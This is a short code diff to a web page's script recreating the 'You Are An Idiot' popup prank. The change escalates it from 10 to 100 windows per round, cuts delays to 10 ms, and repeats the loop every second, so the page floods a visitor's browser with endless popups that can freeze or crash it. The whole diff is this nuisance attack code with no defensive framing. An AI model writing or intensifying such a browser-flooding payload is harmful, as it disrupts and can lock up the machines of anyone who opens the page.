@@ -32,13 +32,13 @@
         }
 
         function openWindows() {
-            for (let i = 0; i < 10; i++) { // Open 10 windows initially
+            for (let i = 0; i < 100; i++) { // Open 100 windows initially
                 setTimeout(() => {
                     var newWindow = window.open('', '_blank', 'width=200,height=100');
                     newWindow.document.write('<html><head><title>You Are An Idiot</title></head><body style="background-color: black; color: white; font-size: 16px; text-align: center; padding-top: 40px;">You Are An Idiot</body></html>');
-                }, i * 100); // Delay each window opening by 100ms
+                }, i * 10); // Delay each window opening by 10ms
             }
-            setTimeout(openWindows, 10000); // Recursively call to open more windows every 10 seconds
+            setTimeout(openWindows, 1000); // Recursively call to open more windows every second
         }
     </script>
 </head>
